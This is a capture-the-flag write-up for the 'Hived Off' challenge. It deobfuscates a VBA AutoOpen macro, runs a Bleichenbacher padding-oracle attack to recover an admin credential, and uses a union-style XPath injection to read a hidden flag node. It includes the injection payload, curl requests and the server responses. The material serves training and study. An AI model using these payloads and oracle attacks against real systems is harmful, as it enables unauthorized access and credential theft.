> **Solved and written by** Hrishikesh (`hrishikesh`) · **Team** Cyfer Trace · **Submitted** Oct. 23, 2026, 11:30 a.m.
>
> **Official challenge:** Hived Off CRW1 · **Category:** Forensics · **Difficulty:** Expert · **Points:** 700 · **Solves:** 107
>
> This writeup was contributed by the named teammate for the Cyfer Trace archive. It is not personal work by Ishant Choudhary. Light formatting and file links were added here; the technical content is the author's.

---

# CTF7 — "Hived Off" — Writeup

**Flag:** `ctf7{vba_macro_bleichenbacher_xpath_pivot}`

## Overview

A three-stage chain where each stage's output unlocks the next:

| Stage | Discipline | Target | Artifact produced |
|-------|-----------|--------|--------------------|
| 1 | Forensics | `http://2.31.70.16:16240/` | `oracle_token` + beacon endpoint |
| 2 | Crypto | `tcp://2.31.70.16:16241` | Admin credential (RSA plaintext) |
| 3 | Web | `http://2.31.70.16:16242/` | The flag |

---

## Stage 1 — Forensics: deobfuscating the VBA macro

The stage 1 page serves a quarantined phishing attachment:

```
curl -O http://2.31.70.16:16240/quarterly_invoice.doc
file quarterly_invoice.doc
# Composite Document File V2 Document (OLE2 / Word .doc)
```

Extracted the macro with `oletools`:

```
python3 -m oletools.olevba quarterly_invoice.doc
```

This revealed an `AutoOpen` macro that builds a config string via a custom `Deob()` routine:

```vb
Private Const XKEY As Long = &H5A

Private Function Deob(ByVal s As String) As String
    Dim raw() As Byte, i As Long, t As String
    t = StrReverse(s)
    raw = DecodeBase64(t)
    For i = 0 To UBound(raw)
        raw(i) = raw(i) Xor XKEY
    Next i
    Deob = BytesToStr(raw)
End Function

Sub AutoOpen()
    Dim cfg As String
    cfg = Deob("r5GastGY/YTO7gSN3xDP1cnP/wyMyUXdgpSOucmL0MTNq4DN/EGauNmY5gWO58Dbr9DOshmb88zYjxWbtt2ajt2a88mapVQMuUzZ08TM14SB/YTO7gSN")
    Call Stage(cfg)
End Sub
```

The obfuscation layers are, in order: **reverse the string → Base64-decode → XOR every byte with `0x5A`**. Reversing it in Python:

```python
import base64
s = "r5GastGY/YTO7gSN3xDP1cnP/wyMyUXdgpSOucmL0MTNq4DN/EGauNmY5gWO58Dbr9DOshmb88zYjxWbtt2ajt2a88mapVQMuUzZ08TM14SB/YTO7gSN"
t = s[::-1]
raw = bytes(b ^ 0x5A for b in base64.b64decode(t))
print(raw.decode())
```

Output:

```
oracle_token=otk_305f1191177699ef426be16ecc2c8942;endpoint=tcp://hived-off-oracle:16241
```

→ **Stage 1 result:** token `otk_305f1191177699ef426be16ecc2c8942`, endpoint maps to `nc 2.31.70.16 16241`.

---

## Stage 2 — Crypto: Bleichenbacher padding-oracle attack

Connecting to the oracle:

```
$ nc 2.31.70.16 16241
{"service": "legacy credential-unwrap PKCS#1 v1.5 oracle", "note": "AUTH <oracle_token> to receive public key + target"}
AUTH otk_305f1191177699ef426be16ecc2c8942
{"n": "<1024-bit modulus hex>", "e": 65537, "k": 128, "target_ciphertext": "<256 hex chars>"}
OK
```

After `AUTH`, the protocol accepts `DECRYPT <hex>\n` and replies `VALID` or `INVALID` depending on whether the PKCS#1 v1.5 padding of the decrypted ciphertext is well-formed (`00 02 <non-zero padding ≥8 bytes> 00 <message>`). This is a textbook **Bleichenbacher 1998 adaptive-chosen-ciphertext attack** surface — it leaks padding validity without ever revealing the plaintext or the private key.

### Attack

Classic algorithm, implemented in Python:

1. **Blinding (step 1):** the given `target_ciphertext` itself returns `VALID`, so `s0 = 1`, no blinding needed.
2. **Step 2a:** find the smallest `s ≥ ⌈n / 3B⌉` (where `B = 2^(8·(k-2))`) such that `c0·s^e mod n` is padding-conforming.
3. **Step 2c / 3:** iteratively narrow the candidate interval `M` for the plaintext using the standard interval-splitting math, re-querying the oracle for each candidate `s` until `M` collapses to a single value `m`.

Each oracle query is a real network round trip (~170 ms). A naive sequential implementation would need ~20,000+ queries just for step 2a (expected ≈ n/(3B) ≈ 2¹⁶ candidates), which is far too slow serially. **Parallelized the search**: maintained a pool of 64 persistent authenticated TCP connections and tested batches of 64 candidate `s` values concurrently via threads, taking the smallest valid `s` found in each batch. This cut wall-clock time dramatically — total attack: **23,371 oracle queries in ~629 seconds (~10.5 min)**.

Key implementation points:
- `DECRYPT <hex>\n` (no trailing `;` — despite the challenge text, the live protocol only accepts a bare newline-terminated hex string; sending a `;` triggers `ERR_BAD_INPUT`).
- 128-byte (1024-bit) ciphertexts, zero-padded hex.
- Interval-narrowing formulas:
  - `r_lo = ceil(a·s - 3B + 1, n)`, `r_hi = floor(b·s - 2B, n)`
  - `new_a = max(a, ceil(2B + r·n, s))`, `new_b = min(b, floor(3B - 1 + r·n, s))`

Recovered plaintext (PKCS#1v1.5 unpadded):

```
0002 b4d6fbde1957a91dbbf506db79d2af43f7b8822d2b06256cd9592b91eb82f42a2743f5276cba3ed4e9156656c123a0472ad46d805298725485f6342dee80492e89b4df1993f640ec8745322823f0fe95e8a9ac5475d4165fb8d8d52983e446141b00 61646d5f366136326132663439666139343861346630316162653930
```

After the `00` separator, the message bytes decode to ASCII:

```
adm_6a62a2f49fa948a4f01abe90
```

→ **Stage 2 result:** admin credential `adm_6a62a2f49fa948a4f01abe90`.

---

## Stage 3 — Web: XPath injection

The admin portal (`http://2.31.70.16:16242/`) requires login:

```
curl -s -i -c cookies.txt -X POST http://2.31.70.16:16242/login \
  -d "username=admin" -d "password=adm_6a62a2f49fa948a4f01abe90"
```

```json
{"message":"welcome, admin","status":"ok"}
```

`username=admin` + the recovered secret as the password authenticated successfully, setting an admin session cookie.

### Finding the injection

`/search?q=<name>` is backed by an XPath query over an XML user store. Probing with a syntax-breaking payload (`q=']`) echoed the full server-side query back in the error message — a very convenient oracle:

```
curl -b cookies.txt --get "http://2.31.70.16:16242/search" --data-urlencode "q='"
```

```json
{"error":"XPath error: Invalid expression",
 "query":"/directory/users/user[contains(displayName, '']')]/displayName"}
```

Revealing the exact server-side template:

```
/directory/users/user[contains(displayName, '{q}')]/displayName
```

### Exploiting it

Since the query is built via naive string concatenation, a **UNION-style XPath injection** using the `|` operator lets us splice in an arbitrary extra path alongside the legitimate one, while still closing out the original syntax validly (our input provides the closing `')]/displayName`-compatible tail via a fresh, empty `contains(...)` clause):

```
q = x')]/displayName | //*[local-name()='flag'] | /directory/users/user[contains(displayName,'
```

Full resulting query (server-constructed):

```
/directory/users/user[contains(displayName, 'x')]/displayName
  | //*[local-name()='flag']
  | /directory/users/user[contains(displayName,'')]/displayName
```

Request:

```
curl -s -b cookies.txt --get "http://2.31.70.16:16242/search" \
  --data-urlencode "q=x')]/displayName | //*[local-name()='flag'] | /directory/users/user[contains(displayName,'"
```

Response:

```json
{"query":"...","results":["Site Administrator","John Smith","Alice Dewar","Bhavin Patel","Maja Kovac",
"ctf7{vba_macro_bleichenbacher_xpath_pivot}"]}
```

→ **Flag:** `ctf7{vba_macro_bleichenbacher_xpath_pivot}`

---

## Summary of the kill chain

1. **Deobfuscate** a VBA macro (reverse → base64 → XOR) → oracle token + endpoint.
2. **Bleichenbacher attack** on a PKCS#1 v1.5 padding oracle (no private key needed) → admin credential.
3. **XPath injection** via error-based query disclosure + UNION (`|`) operator → pivot off the legitimate user-list query to read an unrelated `flag` node → flag.
